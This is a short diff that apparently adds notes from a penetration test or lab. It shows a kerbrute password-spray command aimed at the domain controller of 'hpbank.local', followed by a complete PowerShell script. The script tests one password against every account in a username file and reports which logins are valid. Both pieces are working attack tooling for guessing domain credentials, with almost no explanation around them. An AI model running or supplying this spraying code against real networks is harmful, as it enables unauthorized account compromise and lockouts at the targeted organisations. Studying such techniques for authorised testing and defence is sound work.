@@ -1,1 +1,26 @@
 kerbrute_windows_amd64.exe passwordspray -d hpbank.local --dc dc01.hpbank.local usernames.txt P@ssw0rd
+
+Pure powershell:
+
+$domain = "hpbank.local"
+$userList = Get-Content -Path "C:\Users\Administrator\Desktop\users.txt"
+$password = "P@ssw0rd"
+
+# Load the required .NET assembly
+Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+
+# Define the function to validate credentials
+Function Test-Credentials($userName, $password) {
+    $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
+    Return $pc.ValidateCredentials($userName, $password)
+}
+
+# Iterate through the user list
+ForEach ($user in $userList) {
+    $isValid = Test-Credentials -userName $user -password $password
+    If ($isValid) {
+        Write-Host "[$user] - Valid password: $password"
+    } Else {
+        Write-Host "[$user] - Invalid password: $password"
+    }
+}
